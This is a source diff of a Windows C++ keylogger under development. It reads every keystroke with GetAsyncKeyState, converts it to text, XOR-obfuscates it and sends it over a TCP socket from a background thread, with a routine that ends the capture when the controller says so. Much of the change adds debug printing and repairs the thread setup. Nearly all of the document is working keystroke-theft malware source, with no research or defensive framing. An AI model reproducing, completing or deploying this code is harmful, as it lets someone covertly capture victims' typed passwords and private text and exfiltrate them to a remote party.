@@ -4,8 +4,9 @@
 
 Keylogger::Keylogger(SOCKET &sock)
 {
+    a_sock = sock;;
+    wcout << "SOCK: " << a_sock << endl;
     setup();
-    a_sock = sock;
 }
 
 
@@ -20,7 +21,6 @@ VOID Keylogger::setup()
 
 wstring Keylogger::specialKey(INT &keystroke)
 {
-  //  wcout << "keystroke: " << keystroke << endl;
     switch(keystroke)
     {
     //http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
@@ -152,6 +152,7 @@ wstring Keylogger::specialKey(INT &keystroke)
     }
 }
 
+
 wstring Keylogger::intToUnicode(INT keystroke)
 {
     BYTE kState[256]={0};
@@ -166,19 +167,54 @@ wstring Keylogger::intToUnicode(INT keystroke)
     return (wstring) uni_key;
 }
 
+
+struct Keylogger::PARAMETERS
+{
+    SOCKET sock;
+};
+
+
+ DWORD WINAPI Keylogger::StaticThreadStart(LPVOID param) //https://stackoverflow.com/questions/8994224/efficiently-passing-parameters-to-function-in-another-thread-in-c
+{
+   
+    PARAMETERS* params = (PARAMETERS*)param;
+    
+    wcout << "StaticThreadStart: " << params->sock << endl; 
+
+    Keylogger keylogger(params->sock);
+    keylogger.directTcp();
+  
+    return 0;
+}
+
+
+HANDLE Keylogger::startThread()
+{
+    wcout << "In startThread " << endl;
+
+    DWORD dwThreadID;
+    PARAMETERS *params = new PARAMETERS;  //I have to go through a structure to allow the socket to be initialized.  
+    params->sock =a_sock;
+
+    wcout << "starthread: " << params->sock << endl;
+    HANDLE thread_handler_keylogger = CreateThread(NULL, 0,  StaticThreadStart, params, 0 ,&dwThreadID); //https://stackoverflow.com/questions/1372967/how-do-you-use-createthread-for-functions-which-are-class-members
+    return thread_handler_keylogger;
+}
+
+
 VOID Keylogger::directTcp()
 {   
     wcout << "goooo" <<endl;
+
     wstring unicode_char;
     while (true)
     {
         Sleep(10);
         for(INT keystroke=8; keystroke <= 222; keystroke++) //Test toute les touche
         {
-            //cout  << keystroke << endl;
             if(GetAsyncKeyState(keystroke) == -32767)
             {
-                //cout << keystroke << endl;
+                cout << keystroke << endl;
                 if((keystroke>=39)&&(keystroke<91))
                 {
                     //not SpecialKey
@@ -188,23 +224,47 @@ VOID Keylogger::directTcp()
                 {
                     unicode_char = specialKey(keystroke);
                 }
-                
-                send(a_sock, (char *)XOREncryption(unicode_char).c_str(),unicode_char.length() * sizeof(WCHAR), 0);
+
+                wcout << "send char: "<<unicode_char << endl;
+                wcout << "len: " << unicode_char.length() << endl;
+                wcout << "sock: " << a_sock << endl;
+                int stattt = send(a_sock, (char *)XOREncryption(unicode_char).c_str(),unicode_char.length() * sizeof(WCHAR), 0);
+                wcout << "realy ????: " << stattt << endl;
             }
         }
     }
 }
-VOID WINAPI Keylogger::StaticThreadStart()
-{
-    ;
- //???
-}
-VOID Keylogger::startThread()
-{
-    wcout << "In startThread " << endl;
 
-    DWORD dwThreadID;
-    HANDLE thread_keylogger = CreateThread(NULL, 0, directTcp, NULL, 0 ,&dwThreadID)
+
+VOID Keylogger::waitingEndSession(HANDLE &thread_to_finish)//waits to receive an end-of-connection message  for directTcp
+{
+    WCHAR buff[512]={0};
+    while(TRUE)
+    {
+        int stat = recv(a_sock, (CHAR *)buff, sizeof(buff), 0);
+        if(stat == SOCKET_ERROR)
+        {
+            wcout << "SOCKET_ERROR" << endl;
+            break;
+        }
+        else if (buff == L"\r\n")
+        {
+            wcout << "stop waitingEndSession" << endl;
+            break;
+        }
+        wcout << buff << endl;
+
+        ZeroMemory(&buff, sizeof(buff));
+        wcout << "reset buff" << endl;
+
+    }
+    DWORD exitCode;
+    wcout << "stop thread baby !" << endl;
+    TerminateThread(thread_to_finish, exitCode);
+    wcout << "exit code: " << exitCode << endl; 
 }
+
 Keylogger::~Keylogger()
 {;}
+
+//----------------------------------------------------------------------------------
